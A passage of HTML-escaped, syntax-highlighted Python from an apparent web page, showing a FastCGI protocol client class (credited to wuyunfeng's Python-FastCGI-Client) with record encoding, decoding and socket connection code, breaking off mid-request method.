BytesIO&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;PY2 = &lt;span class=&#34;literal&#34;&gt;True&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; sys.version_info.major == &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;False&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;bchr&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;i&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; PY2:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; force_bytes(&lt;span class=&#34;built_in&#34;&gt;chr&lt;/span&gt;(i))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;bytes&lt;/span&gt;([i])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;bord&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;c&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;isinstance&lt;/span&gt;(c, &lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; c&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;ord&lt;/span&gt;(c)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;force_bytes&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;s&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;isinstance&lt;/span&gt;(s, &lt;span class=&#34;built_in&#34;&gt;bytes&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; s&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; s.encode(&lt;span class=&#34;string&#34;&gt;&amp;#x27;utf-8&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;strict&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;force_text&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;s&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;issubclass&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;type&lt;/span&gt;(s), &lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; s&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;isinstance&lt;/span&gt;(s, &lt;span class=&#34;built_in&#34;&gt;bytes&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        s = &lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(s, &lt;span class=&#34;string&#34;&gt;&amp;#x27;utf-8&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;strict&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        s = &lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(s)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; s&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;FastCGIClient&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&amp;quot;A Fast-CGI Client for Python&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;# private&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    __FCGI_VERSION = &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    __FCGI_ROLE_RESPONDER = &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    __FCGI_ROLE_AUTHORIZER = &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    __FCGI_ROLE_FILTER = &lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    __FCGI_TYPE_BEGIN = &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    __FCGI_TYPE_ABORT = &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    __FCGI_TYPE_END = &lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    __FCGI_TYPE_PARAMS = &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    __FCGI_TYPE_STDIN = &lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    __FCGI_TYPE_STDOUT = &lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    __FCGI_TYPE_STDERR = &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    __FCGI_TYPE_DATA = &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    __FCGI_TYPE_GETVALUES = &lt;span class=&#34;number&#34;&gt;9&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    __FCGI_TYPE_GETVALUES_RESULT = &lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    __FCGI_TYPE_UNKOWNTYPE = &lt;span class=&#34;number&#34;&gt;11&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    __FCGI_HEADER_SIZE = &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;# request state&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    FCGI_STATE_SEND = &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    FCGI_STATE_ERROR = &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    FCGI_STATE_SUCCESS = &lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;__init__&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;self, host, port, timeout, keepalive&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.host = host&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.port = port&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.timeout = timeout&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; keepalive:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            self.keepalive = &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            self.keepalive = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.sock = &lt;span class=&#34;literal&#34;&gt;None&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.requests = &lt;span class=&#34;built_in&#34;&gt;dict&lt;/span&gt;()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;__connect&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;self&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.sock.settimeout(self.timeout)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;# if self.keepalive:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;# else:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;try&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            self.sock.connect((self.host, &lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(self.port)))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;except&lt;/span&gt; socket.error &lt;span class=&#34;keyword&#34;&gt;as&lt;/span&gt; msg:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            self.sock.close()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            self.sock = &lt;span class=&#34;literal&#34;&gt;None&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;repr&lt;/span&gt;(msg))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;False&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;True&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;__encodeFastCGIRecord&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;self, fcgi_type, content, requestid&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        length = &lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(content)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        buf = bchr(FastCGIClient.__FCGI_VERSION) \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              + bchr(fcgi_type) \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              + bchr((requestid &amp;gt;&amp;gt; &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;) &amp;amp; &lt;span class=&#34;number&#34;&gt;0xFF&lt;/span&gt;) \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              + bchr(requestid &amp;amp; &lt;span class=&#34;number&#34;&gt;0xFF&lt;/span&gt;) \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              + bchr((length &amp;gt;&amp;gt; &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;) &amp;amp; &lt;span class=&#34;number&#34;&gt;0xFF&lt;/span&gt;) \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              + bchr(length &amp;amp; &lt;span class=&#34;number&#34;&gt;0xFF&lt;/span&gt;) \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              + bchr(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              + bchr(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;              + content&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; buf&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;__encodeNameValueParams&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;self, name, value&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        nLen = &lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(name)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        vLen = &lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(value)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        record = &lt;span class=&#34;string&#34;&gt;b&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; nLen &amp;lt; &lt;span class=&#34;number&#34;&gt;128&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            record += bchr(nLen)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            record += bchr((nLen &amp;gt;&amp;gt; &lt;span class=&#34;number&#34;&gt;24&lt;/span&gt;) | &lt;span class=&#34;number&#34;&gt;0x80&lt;/span&gt;) \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                      + bchr((nLen &amp;gt;&amp;gt; &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;) &amp;amp; &lt;span class=&#34;number&#34;&gt;0xFF&lt;/span&gt;) \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                      + bchr((nLen &amp;gt;&amp;gt; &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;) &amp;amp; &lt;span class=&#34;number&#34;&gt;0xFF&lt;/span&gt;) \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                      + bchr(nLen &amp;amp; &lt;span class=&#34;number&#34;&gt;0xFF&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; vLen &amp;lt; &lt;span class=&#34;number&#34;&gt;128&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            record += bchr(vLen)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            record += bchr((vLen &amp;gt;&amp;gt; &lt;span class=&#34;number&#34;&gt;24&lt;/span&gt;) | &lt;span class=&#34;number&#34;&gt;0x80&lt;/span&gt;) \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                      + bchr((vLen &amp;gt;&amp;gt; &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;) &amp;amp; &lt;span class=&#34;number&#34;&gt;0xFF&lt;/span&gt;) \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                      + bchr((vLen &amp;gt;&amp;gt; &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;) &amp;amp; &lt;span class=&#34;number&#34;&gt;0xFF&lt;/span&gt;) \&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                      + bchr(vLen &amp;amp; &lt;span class=&#34;number&#34;&gt;0xFF&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; record + name + value&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;__decodeFastCGIHeader&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;self, stream&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        header = &lt;span class=&#34;built_in&#34;&gt;dict&lt;/span&gt;()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        header[&lt;span class=&#34;string&#34;&gt;&amp;#x27;version&amp;#x27;&lt;/span&gt;] = bord(stream[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        header[&lt;span class=&#34;string&#34;&gt;&amp;#x27;type&amp;#x27;&lt;/span&gt;] = bord(stream[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        header[&lt;span class=&#34;string&#34;&gt;&amp;#x27;requestId&amp;#x27;&lt;/span&gt;] = (bord(stream[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;]) &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;) + bord(stream[&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        header[&lt;span class=&#34;string&#34;&gt;&amp;#x27;contentLength&amp;#x27;&lt;/span&gt;] = (bord(stream[&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;]) &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;) + bord(stream[&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        header[&lt;span class=&#34;string&#34;&gt;&amp;#x27;paddingLength&amp;#x27;&lt;/span&gt;] = bord(stream[&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        header[&lt;span class=&#34;string&#34;&gt;&amp;#x27;reserved&amp;#x27;&lt;/span&gt;] = bord(stream[&lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; header&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;__decodeFastCGIRecord&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;self, buffer&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        header = buffer.read(&lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(self.__FCGI_HEADER_SIZE))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;not&lt;/span&gt; header:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;False&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            record = self.__decodeFastCGIHeader(header)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            record[&lt;span class=&#34;string&#34;&gt;&amp;#x27;content&amp;#x27;&lt;/span&gt;] = &lt;span class=&#34;string&#34;&gt;b&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;contentLength&amp;#x27;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; record.keys():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                contentLength = &lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(record[&lt;span class=&#34;string&#34;&gt;&amp;#x27;contentLength&amp;#x27;&lt;/span&gt;])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                record[&lt;span class=&#34;string&#34;&gt;&amp;#x27;content&amp;#x27;&lt;/span&gt;] += buffer.read(contentLength)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;paddingLength&amp;#x27;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; record.keys():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                skiped = buffer.read(&lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(record[&lt;span class=&#34;string&#34;&gt;&amp;#x27;paddingLength&amp;#x27;&lt;/span&gt;]))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; record&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;request&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;self, nameValuePairs=&amp;#123;&amp;#125;, post=&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;not&lt;/span&gt; self.__connect():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;connect failure! please check your fasctcgi-server !!&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        requestId = random.randint(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, (&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;) - &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.requests[requestId] = &lt;span class=&#34;built_in&#34;&gt;dict&lt;/span&gt;()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        request = &lt;span 